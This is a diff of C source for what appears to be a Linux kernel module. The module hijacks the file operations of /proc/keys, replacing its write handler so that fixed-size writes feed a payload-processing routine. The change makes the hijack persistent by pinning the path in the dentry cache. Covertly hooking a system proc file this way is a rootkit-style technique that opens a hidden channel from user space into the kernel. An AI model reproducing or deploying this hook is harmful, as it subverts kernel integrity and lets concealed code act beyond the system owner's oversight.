@@ -1618,33 +1618,34 @@ static int nm_process_payload(unsigned long user_addr)
 static struct file_operations hooked_proc_fops;
 static const struct file_operations *orig_proc_fops;
 static struct inode *target_proc_inode;
+static struct path pinned_proc_path;
 static struct delayed_work nm_dwork;
 
 static ssize_t nm_proc_write(struct file *f, const char __user *buf, size_t c, loff_t *p)
 {
-	int ret;
-	if (c == sizeof(struct nm_payload) && (ret = nm_process_payload((unsigned long)buf)) != -EFAULT)
-		return ret ?: c;
-	return -EIO;
+    int ret;
+    if (c == sizeof(struct nm_payload) && (ret = nm_process_payload((unsigned long)buf)) != -EFAULT)
+        return ret ?: c;
+    return -EIO;
 }
 
 static void nm_hijack_proc_ops(void)
 {
-	struct path path;
-	if (!orig_proc_fops && !kern_path("/proc/keys", LOOKUP_FOLLOW, &path)) {
-		orig_proc_fops = (target_proc_inode = d_backing_inode(path.dentry))->i_fop;
-		hooked_proc_fops = *orig_proc_fops;
-		hooked_proc_fops.write = nm_proc_write;
-		smp_store_release(&target_proc_inode->i_fop, &hooked_proc_fops);
-		nm_info("/proc/keys hijacked.\n");
-		path_put(&path);
-	}
+    if (!pinned_proc_path.dentry && !kern_path("/proc/keys", LOOKUP_FOLLOW, &pinned_proc_path)) {
+        orig_proc_fops = (target_proc_inode = d_backing_inode(pinned_proc_path.dentry))->i_fop;
+        hooked_proc_fops = *orig_proc_fops;
+        hooked_proc_fops.write = nm_proc_write;
+        smp_store_release(&target_proc_inode->i_fop, &hooked_proc_fops);
+        nm_info("/proc/keys successfully hijacked and pinned in dcache.\n");
+    }
 }
 
 static void nm_restore_proc_ops(void)
 {
-	if (orig_proc_fops && target_proc_inode->i_fop == &hooked_proc_fops)
-		smp_store_release(&target_proc_inode->i_fop, orig_proc_fops);
+    if (target_proc_inode && target_proc_inode->i_fop == &hooked_proc_fops)
+        smp_store_release(&target_proc_inode->i_fop, orig_proc_fops);
+    if (pinned_proc_path.dentry)
+        path_put(&pinned_proc_path);
 }
 
 static void nm_hijack_worker(struct work_struct *work)
